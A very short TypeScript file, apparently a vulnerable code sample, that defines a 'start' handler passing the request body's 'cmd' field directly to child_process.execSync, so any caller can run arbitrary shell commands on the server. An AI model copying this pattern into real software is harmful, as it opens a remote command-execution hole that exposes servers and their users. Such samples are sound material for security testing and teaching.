import * as child_process from "node:child_process";
export function start(req: Request) {
  child_process.execSync(req.body.cmd);
}
